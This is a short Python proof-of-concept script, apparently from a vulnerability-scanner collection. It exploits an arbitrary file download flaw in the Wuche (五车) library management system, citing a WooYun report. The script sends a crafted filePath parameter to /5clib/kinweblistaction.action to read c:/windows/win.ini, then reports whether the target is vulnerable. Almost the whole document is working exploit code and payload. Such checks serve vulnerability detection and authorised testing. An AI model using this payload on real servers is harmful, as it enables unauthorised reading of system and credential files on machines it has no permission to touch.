#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 五车图书管系统任意下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0128591
author: Lucifer
description: /5clib/kinweblistaction.action文件中,参数filePath未过滤存在任意文件下载。
'''
import sys
import requests
import warnings
def run(url):
        result = ['五车图书管系统任意下载','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/5clib/kinweblistaction.action?actionName=down&filePath=c:/windows/win.ini"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"support" in req.text and r"MPEGVideo" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    